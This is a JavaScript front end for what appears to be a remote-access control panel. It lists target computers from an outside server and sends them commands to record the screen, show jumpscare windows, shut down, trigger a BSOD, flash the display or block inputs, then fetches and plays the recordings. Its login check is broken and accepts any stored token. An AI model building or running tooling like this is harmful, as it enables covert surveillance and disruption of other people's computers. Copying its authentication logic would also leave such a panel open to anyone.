const token = window.location.href.replace(`${window.location.origin}/home`, '')
let computerItems = document.querySelectorAll('.computer-list li');
const computerList = document.querySelector('.computer-list');
const displayArea = document.querySelector('.display-area');
const displayText = document.querySelector('.display-text');
const displayBox = document.querySelector('.display-box');
const options = document.querySelector('.options');
const loader = document.querySelector('.loader');
const logs = document.querySelector('.logs');
const menu = document.querySelector('.menu');
const log = document.querySelector('.log');
const duration = 5;

let optionsMenu = null
let currentComputer = '';
let currentTime = '';
let retryNum = 0

const terminal = (function() {
    const terminal = function() {
        log.innerHTML += '<p class="init">[INIT] Terminal active.'
        log.scrollTop = log.scrollHeight;
    };

    terminal.clear = function() {
        log.innerHTML = ``
        log.scrollIntoView({
            behavior: 'smooth',
            block: 'end'
        });
    };

    terminal.log = function(message) {
        log.innerHTML += `<p>[LOG] ${message}</p>`
        log.scrollIntoView({
            behavior: 'smooth',
            block: 'end'
        });
    };

    terminal.warn = function(message) {
        log.innerHTML += `<p class="warn">[WARN] ${message}</p>`;
        log.scrollIntoView({
            behavior: 'smooth',
            block: 'end'
        });
    };

    terminal.error = function(message) {
        log.innerHTML += `<p class="error">[ERR!] ${message}</p>`;
        log.scrollIntoView({
            behavior: 'smooth',
            block: 'end'
        });
    }

    return terminal;
})();

async function refreshPCList() {
    const res = await fetch('https://cslckrwbcl.lrdevstudio.com/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ all_computers: 'none' })
    });
    const computers = await res.json();
    computerList.innerHTML += computers.map(c => `<li>${c}</li>`).join('');
    terminal.log('Loaded computers.')
    computerItems = document.querySelectorAll('.computer-list li');
}

async function sendAction(action, extra = {}) {
    try {
        const res = await fetch('https://cslckrwbcl.lrdevstudio.com/messages', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action,
                ...extra
            })
        })

        if (!res.ok) {
            throw new Error(`HTTP ${res.status}`)
        }

        const data = await res.json()
        terminal.log(`"${JSON.stringify(data)}"`)
        return data

    } catch (err) {
        terminal.error(`Failed to send "${action}"`)
        console.error(err)
    }
}


setTimeout(() => {
    if (token != '') {
        if (localStorage.getItem('cslckrmngr_token') == token.substring(7) || localStorage.getItem('cslckrmngr_token') != undefined) {
            terminal.log('Validated login')
            terminal.warn('Token will be required for authentication at all times.')
        } else {
            terminal.error('Incorrect login token')
            setTimeout(() => {
                localStorage.clear()
                window.location.href = '/'
            }, 1000)
        }
    } else {
        terminal.error('Incorrect login token')
        setTimeout(() => {
            localStorage.clear()
            window.location.href = '/'
        }, 1000)
    }
    loader.style.animation = 'fade-out 1s ease-in-out';
    setTimeout(() => {
        loader.style.display = 'none';
        menu.style.display = 'flex';
        menu.style.animation = 'fade-in 1s ease-in-out';
        setTimeout(() => {
            terminal()
        }, 1000)
    }, 1000);
}, 1000);

(async () => {
    options.classList.add('disabled')
    options.style.pointerEvents = 'none'
    options.style.opacity = '0.4'

    function createOptionsMenu() {
        optionsMenu = document.createElement('div')
        optionsMenu.className = 'options-menu'
        optionsMenu.innerHTML = `
            <button data-action="record">Record Screen</button>
            <button data-action="clear">Clear Logs</button>
            <button data-action="jumpscare">Jumpscare</button>
            <button data-action="shutdown">Shutdown PC</button>
            <button data-action="bsod">BSOD</button>
            <button data-action="flash">Flash PC</button>
            <button data-action="block">Block Inputs</button>
            <button data-action="update">Release Update</button>
        `
        menu.appendChild(optionsMenu)
    }

    function closeOptionsMenu() {
        if (!optionsMenu) return

        optionsMenu.classList.remove('show')
        options.classList.remove('active')
    }

    options.addEventListener('click', e => {
        e.stopPropagation()
        if (!optionsMenu) createOptionsMenu()

        const rect = options.getBoundingClientRect();

        optionsMenu.style.left = `${rect.right - optionsMenu.offsetWidth}px`;
        optionsMenu.style.top = `${rect.top - optionsMenu.offsetHeight - 6}px`;

        optionsMenu.classList.toggle('show')
        options.classList.toggle('active')
    })

    document.addEventListener('click', e => {
        if (!options.contains(e.target)) {
            closeOptionsMenu()
        }
    })

    document.addEventListener('keydown', e => {
        if (e.key === 'Escape') closeOptionsMenu()
    })

    function openPopup(popup_name, popup_button, input_type, action) {
        const overlay = document.createElement('div')
        overlay.className = 'popup-overlay'

        const popup = document.createElement('div')
        popup.className = 'popup-box'

        const inputHTML = input_type === 'number'
            ? '<input type="number" min="1" value="5" class="popup-input">'
            : input_type === 'string'
            ? '<input type="text" class="popup-input">'
            : ''

        popup.innerHTML = `
            <p>${popup_name}</p>
            ${inputHTML}
            <button class="popup-button">${popup_button}</button>
        `

        overlay.appendChild(popup)
        document.body.appendChild(overlay)

        const button = popup.querySelector('.popup-button')
        const input = popup.querySelector('.popup-input')

        button.addEventListener('click', () => {
            const value = input ? input.value : null
            action(value)
            document.body.removeChild(overlay)
        })

        overlay.addEventListener('click', e => {
            if (e.target === overlay) document.body.removeChild(overlay)
        })

        document.addEventListener('keydown', function escHandler(e) {
            if (e.key === 'Escape') {
                document.body.removeChild(overlay)
                document.removeEventListener('keydown', escHandler)
            }
        })
    }

    document.addEventListener('click', async e => {
        const btn = e.target.closest('.options-menu button')
        if (!btn) return
        const action = btn.dataset.action

        if (action === 'record') {
            const now = new Date()
            currentTime = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}_${String(now.getHours()).padStart(2, '0')}-${String(now.getMinutes()).padStart(2, '0')}`

            terminal.log(`POSTED: record-${computerName}-${currentTime} (${duration}s)`)
            openPopup('Recording duration', 'Start recording', 'number', async (value) => await sendAction(`record-${computerName}`, { time: currentTime, duration: duration }))
            renderVideo(computerName, currentTime)
        } else if (action === 'clear') { 
            terminal.clear()
        } else if (action === 'jumpscare') {
            alert('ede')
            openPopup('Window amount', 'Send request', 'number',  async (value) => await sendAction(`jumpscare-${computerName}`, { data: value }))
        } else if (action === 'shutdown') { 
            terminal.error('Shutdown signal sent')
        } else if (action === 'bsod') { 
            terminal.error('BSOD triggered')
        } else if (action === 'flash')  {
            terminal.warn('Flash command issued')
        } else if (action === 'block') { 
            terminal.warn('Inputs blocked')
        } else if (action === 'update') {
            terminal.log('Update released')
        }
    })

    const res = await fetch('https://cslckrwbcl.lrdevstudio.com/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ all_computers: 'none' })
    })

    const computers = await res.json()
    computerList.innerHTML = computers.map(c => `<li>${c}</li>`).join('')
    terminal.log('Loaded computers.')

    computerItems = document.querySelectorAll('.computer-list li')

    computerItems.forEach(item => {
        item.addEventListener('click', () => {

            document.querySelectorAll('.computer-list li')
                .forEach(li => li.classList.remove('active'))
            item.classList.add('active')

            computerName = item.innerHTML.trim()

            options.classList.remove('disabled')
            options.style.pointerEvents = 'auto'
            options.style.opacity = '1'

            terminal.log(`Selected computer: ${computerName}`)
        })
    })

})();


async function renderVideo(computer, timestamp) {
    const res = await fetch('https://cslckrwbcl.lrdevstudio.com/messages');
    const text = await res.text();

    if (!text || text.trim() === '[]') {
        setTimeout(() => renderVideo(computer, timestamp), 1000);
    } else if (!text.includes('screen-recording-ready')) {
        terminal.warn("Wrong fetch, refunding post.")
        await fetch('https://cslckrwbcl.lrdevstudio.com/messages', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: text,
        });

        terminal.log("Refunded")
        retryNum += 1
        if (retryNum == 5) {
            terminal.error('Request not fetched, maybe target offline?')
            setTimeout(() => {
                displayText.innerHTML = 'No Display'
            }, 2000)
        } else {
            setTimeout(() => renderVideo(computer, timestamp), 1000);
        }
        return;
    } else if (text.includes('screen-recording-ready')) {
        terminal.log("Video ready, rendering")

        if (!displayBox) videoArea = document.querySelector('.screen-rec')
        if (displayBox) videoArea = displayBox
        
        displayBox.outerHTML = `
            <video class='screen-rec' controls autoplay muted>
                <source src="/fetch_recording/${computer}/${timestamp}" type="video/mp4">
            </video>`;
        return;
    }
}
